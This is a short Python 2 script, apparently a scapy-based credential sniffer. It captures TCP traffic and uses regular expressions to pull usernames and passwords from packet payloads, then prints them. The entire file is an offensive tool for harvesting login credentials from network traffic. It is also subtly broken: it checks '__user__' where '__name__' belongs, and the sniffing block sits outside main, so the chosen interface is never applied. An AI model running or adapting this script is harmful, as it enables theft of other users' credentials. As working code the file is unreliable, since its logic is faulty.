import optparse
from scapy.all import *
def findGuest(pkt):
 raw=pkt.sprintf('%Raw.load%')
 user=re.findall('(?i)User=(.*)&', raw)
 passw=re.findall("(?i)Password=(.*)'", raw)
 if user:
  print '[+] Found User id ' + str(user[0])+' password #' + str(passw[0])

def main():
 parser = optparse.OptionParser('usage %prog ','-i<interface>')
 parser.add_option('-i', dest='interface',type='string', help='specify interface to listen on')
 (options, args) = parser.parse_args()
 if options.interface == None:
  print parser.usage
  exit(0)
 else:
  conf.iface = options.interface
try:
 print '[*] Starting cet  Sniffer.'
 sniff(filter='tcp', prn=findGuest, store=0)
except KeyboardInterrupt:
 exit(0)

if __user__ == '__main__':
 main()


